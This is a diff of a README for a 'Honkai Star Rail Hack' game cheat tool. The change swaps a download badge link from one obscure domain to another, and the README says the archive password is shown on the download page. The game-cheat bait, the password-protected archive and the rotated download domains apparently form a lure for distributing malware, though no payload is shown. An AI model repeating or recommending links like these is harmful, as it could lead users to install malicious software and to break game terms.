@@ -18,7 +18,7 @@ Honkai Star Rail Hack - game hack and trainer with full feature set. Works with 
 
 ## Download
 
-[![Download v1.2.0](https://img.shields.io/badge/Download_v1.2.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/honkairail)
+[![Download v1.2.0](https://img.shields.io/badge/Download_v1.2.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/honkairail)
 
 > The archive password is shown on the download page.
 
